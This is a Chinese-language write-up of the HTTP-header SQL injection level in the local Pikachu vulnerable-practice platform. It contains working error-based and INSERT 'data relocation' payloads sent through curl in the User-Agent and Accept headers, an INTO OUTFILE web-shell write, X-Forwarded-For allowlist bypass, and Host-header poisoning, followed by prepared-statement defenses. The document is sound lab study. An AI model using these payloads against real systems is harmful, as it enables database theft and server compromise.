---
layout: post
title: Pikachu - SQL注入 http header注入 Writeup（注入点在请求头）
platform: pikachu
date: 2026-10-28 22:30:00 +0800
categories: CTF
---

Pikachu - SQL注入 http header注入 Writeup（注入点在请求头）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SQL-Inject → "http header"注入
- 入口：`http://localhost/pikachu/vul/sqli/sqli_header/sqli_header_login.php`
- 题型：Web
- 考点：**HTTP 头注入**、报错注入、数据搬迁

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu / root / root
```

**两个页面**：

```
sqli_header_login.php   登录（admin / 123456，users 表）
sqli_header.php         主页面（把 HTTP 头信息写进 httpinfo 表）
```

**作者提示**：

| 页面 | 提示 |
|---|---|
| 登录页 | `admin/123456` |
| 主页面 | `这里的问题挺多的,跟http头里面有关的字段都可以测试一下` |

**`httpinfo` 表结构**：

```sql
CREATE TABLE `httpinfo` (
  `id`         int(10) unsigned NOT NULL AUTO_INCREMENT,
  `userid`     int(10) unsigned NOT NULL,
  `ipaddress`  varchar(255) NOT NULL,      -- 来自 REMOTE_ADDR
  `useragent`  varchar(255) NOT NULL,      -- ★ 来自 HTTP_USER_AGENT
  `httpaccept` varchar(255) NOT NULL,      -- ★ 来自 HTTP_ACCEPT
  `remoteport` varchar(255) NOT NULL,      -- 来自 REMOTE_PORT
  PRIMARY KEY (`id`)
)
```

**✅ 实测结果（六种打法）**

| # | 注入点 | payload | 结果 |
|---|---|---|---|
| 1 | （正常 UA）| `Mozilla/5.0` | 写库成功：`id=43, httpaccept=text/html` |
| 2 | **User-Agent** | `' or extractvalue(1,concat(0x7e,database())) or '` | **`XPATH syntax error: '~pikachu'`** ✅ |
| 3 | User-Agent | 同上，`version()` | **`~5.7.26`** ✅ |
| 4 | User-Agent | 同上，`group_concat(table_name)` | **`~httpinfo,member,message,users,x`** ✅ |
| 5 | **Accept** | `' or extractvalue(1,concat(0x7e,database())) or '` | **`~pikachu`** ✅（第二个注入点）|
| 6 | **User-Agent（数据搬迁）** | `x',(select group_concat(concat(username,':',substr(password,1,6))) from users),'y') #` | **`httpaccept=admin:e10adc,pikachu:670b14,test:e99a18`** ✅ |

**登录后拿到的 cookie**：

```text
PHPSESSID  = 33rmtt7pt9ov6ca7r9g600m8qn
ant[uname] = admin
ant[pw]    = 10470c3b4b1fed12c3baac014be15fac67c6e815
```

二、题目分析

**① 漏洞代码：转义被注释掉了**

```php
<?php
// sqli_header.php 第 28-41 行

// $remoteipadd=escape($link, $_SERVER['REMOTE_ADDR']);          ← ★ 全部被注释
// $useragent=escape($link, $_SERVER['HTTP_USER_AGENT']);
// $httpaccept=escape($link, $_SERVER['HTTP_ACCEPT']);
// $httpreferer=escape($link, $_SERVER['HTTP_REFERER']);

//直接获取前端过来的头信息,没人任何处理,留下安全隐患
$remoteipadd = $_SERVER['REMOTE_ADDR'];
$useragent   = $_SERVER['HTTP_USER_AGENT'];          // ★ 注入点
$httpaccept  = $_SERVER['HTTP_ACCEPT'];              // ★ 注入点
$remoteport  = $_SERVER['REMOTE_PORT'];

//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞
$query = "insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport)
          values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
$result = execute($link, $query);
?>
```

**★ 作者连注释都写得很直白**：

```
"直接获取前端过来的头信息,没人任何处理,留下安全隐患"
"存进去之前没有进行转义，导致SQL注入漏洞"
```

**② 关键认知：HTTP 头也是"用户输入"**

**★ 很多开发者只防表单和 URL 参数，忘了 HTTP 头**：

```
他们以为：
    $_POST / $_GET  ← 危险，要过滤
    $_SERVER          ← "服务器变量"，应该安全
    
★ 但 $_SERVER 里有一大半来自【客户端请求头】！
```

**★ 看哪些 `$_SERVER` 变量来自客户端**：

| 变量 | 来源 | 可控性 |
|---|---|---|
| `$_SERVER['REMOTE_ADDR']` | TCP 连接的源 IP | ❌ **不可伪造** |
| `$_SERVER['REMOTE_PORT']` | TCP 源端口 | ❌ 不可控制 |
| `$_SERVER['HTTP_USER_AGENT']` | **请求头 `User-Agent`** | ✅ **完全可控** |
| `$_SERVER['HTTP_ACCEPT']` | **请求头 `Accept`** | ✅ **完全可控** |
| `$_SERVER['HTTP_REFERER']` | **请求头 `Referer`** | ✅ **完全可控** |
| `$_SERVER['HTTP_X_FORWARDED_FOR']` | **请求头 `X-Forwarded-For`** | ✅ **完全可控** |
| `$_SERVER['HTTP_COOKIE']` | **请求头 `Cookie`** | ✅ **完全可控** |
| `$_SERVER['HTTP_HOST']` | **请求头 `Host`** | ✅ **完全可控** |

**★ 记忆口诀**：

```
凡是以 HTTP_ 开头的 $_SERVER 变量
→ 都来自【请求头】
→ 客户端完全操控
→ 都是注入点
```

**★ 本关为什么 `REMOTE_ADDR` 打不了**：

```php
$remoteipadd = $_SERVER['REMOTE_ADDR'];    // 真实 IP，不可伪造
```

**★ 但如果代码写的是**：

```php
$x = $_SERVER['HTTP_X_FORWARDED_FOR'];     // ★ 可伪造 → 可注入
```

**★ 那 `X-Forwarded-For` 就是一个注入点。**

**★ 现实中很多"获取真实 IP"的代码都这么写，是重灾区。**

**③ 登录检查（必须先登录）**

```php
// sqli_header.php 第 24-27 行
$is_login_id = check_sqli_login($link);
if(!$is_login_id){
    header("location:sqli_header_login.php");
}
```

**★ 登录逻辑（`sqli_header_login.php` 第 30-32 行）**：

```php
$username = escape($link, $_POST['username']);      // 有转义
$password = escape($link, $_POST['password']);
$query = "select * from users where username='$username' and password=md5('$password')";
```

**★ 用的是 `users` 表（不是 `member`）**：

```
users 表：admin / pikachu / test
member 表：vince / allen / kobe / grady / kevin / lucy / lili
```

**★ 登录后设置两个 cookie**：

```php
setcookie('ant[uname]', $_POST['username'], time()+36000);          // 10 小时
setcookie('ant[pw]', sha1(md5($_POST['password'])), time()+36000);
```

**★ 所以有两种方式"过登录检查"**：

```
方式 1：正常登录 admin/123456
方式 2：伪造 cookie（ant[pw] = sha1(md5('123456'))）
        ★ 这就是 CSRF 那关学过的 Pass-the-Hash
```

**④ INSERT 结构分析（闭合）**

```sql
insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport)
values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')
        └────┬────┘└─────┬────┘└────┬────┘└─────┬────┘└─────┬────┘
          5 个字段，每个都被 '...' 包裹
```

**★ 所以要闭合 `'`：**

```
正常值：Mozilla/5.0
→ values('1','::1','Mozilla/5.0','text/html','54321')

注入值：' or extractvalue(...) or '
→ values('1','::1','' or extractvalue(...) or '','text/html','54321')
                  └────────────┬────────────┘
                        表达式被求值 → 报错
```

**★ 为什么前后都要 `or '`？**

```
前面：'  → 闭合 SQL 的引号
中间：or extractvalue(...)  → 注入的表达式
后面：or '  → 补一个新的引号，让后面那个 ' 有配对

★ 这样 5 个值的结构不变（还是 5 个），只是第 3 个值变成了"表达式"
```

**⑤ 报错信息在页面中间（老问题）**

```php
include header.php;          // ① 输出 30KB 导航栏
...
execute($link, $query);      // ② 报错在这里 exit()
?>
<div class="main-content">   // ③ 没执行
```

**★ 所以搜索 `XPATH` 或 `You have an error`，不要只看页面末尾。**

**⑥ 数据搬迁：INSERT 注入的另一条路**

**★ 既然能注入，就能让 INSERT 写入"别人的数据"**：

```sql
-- 原始
values('1','::1','x',(select ...),'y')

-- 完整语句（用 # 注释掉尾部）
insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport)
values('1','::1','x',(select group_concat(concat(username,':',substr(password,1,6))) from users),'y')
```

**★ 实测结果**：

```sql
id=46 | userid=1 | ipaddress=::1 | useragent=x | httpaccept=admin:e10adc,pikachu:670b14,test:e99a18
```

**★ 这个技术的意义**：

```
如果 httpinfo 有"访问日志"页面
→ 你访问一下那个页面
→ 就能在网页上看到 users 表的数据了

★ 这叫"数据搬迁"（把 A 表数据搬到 B 表）
★ 是没有回显时的另一种读数据方式
```

三、解题步骤

**第 1 步：登录**

```text
① 打开 http://localhost/pikachu/vul/sqli/sqli_header/sqli_header_login.php
② 输入 admin / 123456
③ 点 Login
④ 跳转到 sqli_header.php
```

**★ 此时浏览器拿到了 `ant[uname]=admin` 和 `ant[pw]=...` 两个 cookie。**

**第 2 步：确认正常功能（会写库）**

```text
① 保持登录状态，刷新 sqli_header.php
② 查数据库：
```

```powershell
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe --host=127.0.0.1 --user=root --password=root --default-character-set=utf8mb4 `
  -e "use pikachu; select * from httpinfo order by id desc limit 3;"
```

**★ 输出**：

```text
id  userid  ipaddress  useragent    httpaccept  remoteport
43  1       ::1        Mozilla/5.0  text/html   12345
```

**★ 说明：每次访问都会把头信息写进 `httpinfo`。**

**第 3 步：⭐ 用 curl 做 UA 注入**

**★ 先拿到 cookie**：

```text
F12 → 应用程序(Application) → Cookie
→ 复制 PHPSESSID 和 ant[pw] 的值
```

**★ 然后发请求**：

```powershell
curl.exe -s "http://localhost/pikachu/vul/sqli/sqli_header/sqli_header.php" `
  -b "PHPSESSID=你的值; ant[uname]=admin; ant[pw]=你的值" `
  -A "' or extractvalue(1,concat(0x7e,database())) or '" `
  | Select-String "XPATH"
```

**★ 预期输出**：

```
XPATH syntax error: '~pikachu'
```

**★ 如果没有任何输出**：说明 cookie 不对（没通过登录检查）—— 页面被 302 到登录页了。

**第 4 步：读版本和表名**

```powershell
# 版本
curl.exe -s "http://localhost/pikachu/vul/sqli/sqli_header/sqli_header.php" `
  -b "PHPSESSID=...; ant[uname]=admin; ant[pw]=..." `
  -A "' or extractvalue(1,concat(0x7e,version())) or '" | Select-String "XPATH"

# 表名
curl.exe -s "http://localhost/pikachu/vul/sqli/sqli_header/sqli_header.php" `
  -b "PHPSESSID=...; ant[uname]=admin; ant[pw]=..." `
  -A "' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) or '" `
  | Select-String "XPATH"
```

**第 5 步：⭐ 用 Accept 头注入（第二个注入点）**

```powershell
curl.exe -s "http://localhost/pikachu/vul/sqli/sqli_header/sqli_header.php" `
  -b "PHPSESSID=...; ant[uname]=admin; ant[pw]=..." `
  -H "Accept: ' or extractvalue(1,concat(0x7e,database())) or '" `
  | Select-String "XPATH"
```

**★ 注意这里是 `-H "Accept: ..."`，不是 `-A`（`-A` 是 User-Agent）。**

**第 6 步：⭐ 数据搬迁（把 users 表数据搬进 httpinfo）**

```powershell
curl.exe -s "http://localhost/pikachu/vul/sqli/sqli_header/sqli_header.php" `
  -b "PHPSESSID=...; ant[uname]=admin; ant[pw]=..." `
  -A "x',(select group_concat(concat(username,':',substr(password,1,6))) from users),'y') #"
```

**★ 然后查数据库**：

```sql
select id, useragent, httpaccept from httpinfo order by id desc limit 3;
```

**★ 预期**：

```text
id  useragent  httpaccept
46  x          admin:e10adc,pikachu:670b14,test:e99a18
```

**★ 成功把 `users` 表的数据"写"进了 `httpinfo.httpaccept` 列。**

**第 7 步：清理测试数据**

```sql
TRUNCATE TABLE httpinfo;
```

**★ 或者**：

```powershell
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe --host=127.0.0.1 --user=root --password=root `
  -e "use pikachu; TRUNCATE TABLE httpinfo;"
```

**第 8 步：完整 payload 汇总**

```
// 注入点 1：User-Agent（curl -A）

' or extractvalue(1,concat(0x7e,database())) or '
' or extractvalue(1,concat(0x7e,version())) or '
' or extractvalue(1,concat(0x7e,user())) or '
' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) or '
' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) or '
' or extractvalue(1,concat(0x7e,(select group_concat(concat(username,':',password)) from users))) or '

// 注入点 2：Accept（curl -H "Accept: ..."）

' or extractvalue(1,concat(0x7e,database())) or '

// 数据搬迁

x',(select group_concat(concat(username,':',substr(password,1,6))) from users),'y') #
```

四、延伸知识

**① 完整的 HTTP 头注入点清单**

| 请求头 | `$_SERVER` 变量 | 常见用途 | 可控 |
|---|---|---|---|
| `User-Agent` | `HTTP_USER_AGENT` | 记录访问者浏览器 | ✅ |
| `Accept` | `HTTP_ACCEPT` | 内容协商 | ✅ |
| `Accept-Language` | `HTTP_ACCEPT_LANGUAGE` | 语言偏好 | ✅ |
| `Referer` | `HTTP_REFERER` | 来源页统计 | ✅ |
| `X-Forwarded-For` | `HTTP_X_FORWARDED_FOR` | **获取真实 IP** | ✅ |
| `X-Real-IP` | `HTTP_X_REAL_IP` | 同上 | ✅ |
| `Client-IP` | `HTTP_CLIENT_IP` | 同上 | ✅ |
| `Cookie` | `HTTP_COOKIE` | 会话标识 | ✅ |
| `Host` | `HTTP_HOST` | 站点域名 | ✅ |
| `Origin` | `HTTP_ORIGIN` | CORS | ✅ |
| `X-Requested-With` | `HTTP_X_REQUESTED_WITH` | 判断 AJAX | ✅ |

**★ 最常见的三个注入点**：

```
① User-Agent  → 几乎所有"访问日志"功能都会记录它
② X-Forwarded-For → 几乎所有"获取真实 IP"的功能都会用它
③ Referer     → 几乎所有"来源统计"功能都会记录它
```

**★ 一个典型的高危代码**：

```php
// 很多"记录访问日志"的代码长这样
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?: $_SERVER['REMOTE_ADDR'];
$query = "insert into log(ip, ua, time) values('$ip', '{$_SERVER['HTTP_USER_AGENT']}', now())";
// ★ 两个注入点：$ip 和 User-Agent
```

**② 头注入为什么常被忽略**

**开发者的思维盲区**：

```
① "参数" = 表单字段 / URL 查询串
   → 会想到过滤

② HTTP 头 = "浏览器自动发的"
   → 觉得"用户改不了"
   → 甚至不知道 F12 / curl 能随便改

★ 实际上：只要是客户端发的，就能改
```

**★ 一个反直觉的事实**：

```
浏览器确实不让你在 F12 里改 User-Agent
（没有这个功能）
→ 所以很多人以为改不了

★ 但 curl / Burp / Python 都能轻松改
★ 而且 F12 的"网络 → 编辑并重发"也能改一部分头
```

**③ 报错注入的回顾（本关用的技术）**

**为什么本关又要用报错注入？**

```sql
insert httpinfo(...) values(...)
    └────┬────┘
   INSERT 不返回数据
   → 没有回显位
   → 不能用 UNION
   → 只能报错注入
```

**★ 三个"能报错"的函数**：

```sql
extractvalue(1, concat(0x7e, (payload)))        -- 推荐
updatexml(1, concat(0x7e, (payload)), 1)        -- 同样效果
floor(rand(0)*2) + group by                     -- 经典"双查询"，较复杂
```

**★ 32 字符限制与分段**：

```sql
-- 先看长度
' or extractvalue(1,concat(0x7e,length((select group_concat(username) from users)))) or '

-- 分段读
' or extractvalue(1,concat(0x7e,substr((select ...),1,20))) or '
' or extractvalue(1,concat(0x7e,substr((select ...),21,20))) or '
```

**④ 数据搬迁技术（写数据代替读数据）**

**思路**：

```
如果"读"不出数据（无回显、无报错）
→ 那就"写"：把数据写到另一个地方
→ 再想办法从那里"读"出来
```

**★ 三种写法**：

**写法 1：写进当前表的另一列（本关做的）**

```sql
-- User-Agent 注入
x',(select group_concat(concat(username,':',password)) from users),'y') #
-- → 数据进了 httpaccept 列
```

**写法 2：写进另一张表（需要 INSERT ... SELECT）**

```sql
-- 需要闭合整个 VALUES 并构造 SELECT
x') select ... from users #
```

**写法 3：直接写文件（如果权限允许）**

```sql
x' into outfile 'D:\\phpstudy_pro\\WWW\\shell.php' #
```

**★ 前提**：

```
MySQL 用户有 FILE 权限
secure_file_priv 允许该目录
```

**★ 数据搬迁的现实意义**：

```
场景：留言板有 SQL 注入，但没有回显，也不报错
→ 但留言板旁边有个"访问统计"页面（显示 UA/Referer）
→ 把 users 表的数据搬到统计表的 UA 列
→ 访问统计页面 → 看到数据
```

**⑤ 头注入的真实案例**

**案例 1：日志表注入（最经典）**

```
很多 CMS 都会记录访问日志：
    insert into log(ip, ua, url, time) values(...)

★ 攻击者改 User-Agent → 写进日志表
★ 如果后台有"查看日志"页面 → 触发 XSS（存储型）
★ 如果日志表有 SQL 注入 → 直接读数据
```

**案例 2：`X-Forwarded-For` 注入**

```php
function getRealIP() {
    return $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
}
```

**★ 用途**：

```
· SQL 注入：X-Forwarded-For: ' or 1=1 #
· 绕过 IP 白名单：X-Forwarded-For: 127.0.0.1
· 绕过频率限制：每次换一个假 IP
```

**★ 这是很多"管理后台只允许内网访问"被绕过的方式。**

**案例 3：Host 头注入**

```
Host: evil.com
→ 如果代码用 $_SERVER['HTTP_HOST'] 拼接链接
→ 密码重置邮件里的链接会指向 evil.com
→ 这就是"Host 头攻击"
```

**⑥ 防御**

**❌ 本关的反面教材**：

```php
// $useragent = escape($link, $_SERVER['HTTP_USER_AGENT']);    // 注释掉
$useragent = $_SERVER['HTTP_USER_AGENT'];                      // 直接用
```

**✅ 正确做法 1：预处理**

```php
$stmt = $link->prepare(
    "insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values(?,?,?,?,?)"
);
$stmt->bind_param('issss',
    $is_login_id,
    $_SERVER['REMOTE_ADDR'],
    $_SERVER['HTTP_USER_AGENT'] ?? '',
    $_SERVER['HTTP_ACCEPT'] ?? '',
    $_SERVER['REMOTE_PORT']
);
$stmt->execute();
```

**✅ 正确做法 2：至少做转义（次优解）**

```php
$useragent = escape($link, $_SERVER['HTTP_USER_AGENT'] ?? '');
```

**✅ 正确做法 3：截断长度**

```php
// User-Agent 不可能有 1000 个字符
$useragent = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 200);
```

**★ 这一招有额外好处**：

```
· 限制注入 payload 的长度
· 防止"超长头"造成的存储膨胀 / DoS
```

**✅ 正确做法 4：不要相信任何头**

```php
// 获取真实 IP 的正确姿势（需要知道代理链）
// 只有当请求确实来自可信代理时，才信任 X-Forwarded-For
if (in_array($_SERVER['REMOTE_ADDR'], $trustedProxies)) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
```

**★ 而且 `$ip` 也要做 `filter_var($ip, FILTER_VALIDATE_IP)` 校验。**

**⑦ SQL 注入模块的完整进度**

| 关卡 | 注入位置 | 类型 | 读数据方式 |
|---|---|---|---|
| 数字型(post) | POST 参数 | 数字 | UNION |
| 字符型(get) | GET 参数 | 字符 | UNION |
| 搜索型 | GET 参数（LIKE）| 字符 | UNION |
| xx型 | GET 参数（括号）| 字符 | UNION |
| **insert/update** | POST 参数 | 写操作 | 报错注入 |
| **delete** | GET 参数 | 写操作 | 报错 / 时间盲注 |
| **http header** | **请求头** | **字符（INSERT）** | **报错注入 / 数据搬迁** |
| 盲注(boolean) | 待做 | — | 布尔盲注 |
| 盲注(time) | 待做 | — | 时间盲注 |
| 宽字节 | 待做 | — | GBK 绕过 |

**★ 七关下来，覆盖了**：

```
注入位置：URL 参数 / POST 参数 / 请求头
数据类型：数字 / 字符 / LIKE / 括号
SQL 操作：SELECT / INSERT / UPDATE / DELETE
读数据方式：UNION / 报错注入 / 时间盲注 / 数据搬迁
```

五、总结

- **本题核心：`$_SERVER['HTTP_USER_AGENT']` 和 `$_SERVER['HTTP_ACCEPT']` 被直接拼进 INSERT 语句 → 头注入。**

- **一行漏洞代码**：

```php
$query = "insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport)
          values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
```

- **⭐ 六个必记要点**：

```text
① HTTP 头也是用户输入
   凡是以 HTTP_ 开头的 $_SERVER 变量都来自请求头 → 完全可控
   ★ REMOTE_ADDR / REMOTE_PORT 不可伪造

② 注入点在请求头，不在表单
   → 要用 curl / Burp / Python 发请求
   → F12 面板改不了 User-Agent

③ 必须先登录
   用 admin/123456（users 表），或伪造 ant[pw] cookie

④ INSERT 注入没有回显 → 用报错注入
   ' or extractvalue(1,concat(0x7e,database())) or '

⑤ 数据搬迁：把 A 表数据写进 B 表
   x',(select group_concat(...) from users),'y') #
   ★ 如果 B 表有展示页面，就能看到数据

⑥ 报错信息在页面中间（header.php 先输出了导航栏）
   调试要搜 XPATH 关键字
```

- **实测数据**：

```text
正常 UA：Mozilla/5.0
    → httpinfo 多一条：id=43, httpaccept=text/html

UA 注入：' or extractvalue(1,concat(0x7e,database())) or '
    → XPATH syntax error: '~pikachu'

version()  → '~5.7.26'
表名        → '~httpinfo,member,message,users,x'

Accept 注入：' or extractvalue(1,concat(0x7e,database())) or '
    → XPATH syntax error: '~pikachu'    ★ 第二个注入点

数据搬迁：x',(select group_concat(concat(username,':',substr(password,1,6))) from users),'y') #
    → httpinfo.httpaccept = 'admin:e10adc,pikachu:670b14,test:e99a18'
```

- **curl 命令模板**：

```powershell
# User-Agent 注入
curl.exe -s "http://localhost/pikachu/vul/sqli/sqli_header/sqli_header.php" `
  -b "PHPSESSID=xxx; ant[uname]=admin; ant[pw]=xxx" `
  -A "' or extractvalue(1,concat(0x7e,database())) or '"

# Accept 注入
curl.exe -s "http://localhost/pikachu/vul/sqli/sqli_header/sqli_header.php" `
  -b "PHPSESSID=xxx; ant[uname]=admin; ant[pw]=xxx" `
  -H "Accept: ' or extractvalue(1,concat(0x7e,database())) or '"
```

**手工复现要点**：

```text
· 登录 admin/123456 → 拿到 cookie
· 正常访问 → 查 httpinfo 表，看到写入了一条
· curl -A 注入 → 看 XPATH 报错里的 '~pikachu'
· curl -H "Accept: ..." → 同样是 '~pikachu'
· curl -A 数据搬迁 payload → 查 httpinfo，httpaccept 列出现 users 数据
· 测完 TRUNCATE TABLE httpinfo
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  HTTP 头 = 用户输入                                          │
│                                                            │
│  凡是以 HTTP_ 开头的 $_SERVER 变量                            │
│      User-Agent / Accept / Referer / X-Forwarded-For ...   │
│  → 客户端完全可控 → 都是注入点                                 │
│                                                            │
│  本关是 INSERT 注入 → 没有回显                                │
│  → 报错注入（extractvalue）读数据                             │
│  → 或"数据搬迁"把数据写进另一张表                              │
│                                                            │
│  ★ F12 改不了 User-Agent → 要用 curl / Burp / Python           │
│  ★ 防御：预处理 + 截断长度 + 不要相信任何头                     │
└────────────────────────────────────────────────────────────┘
```
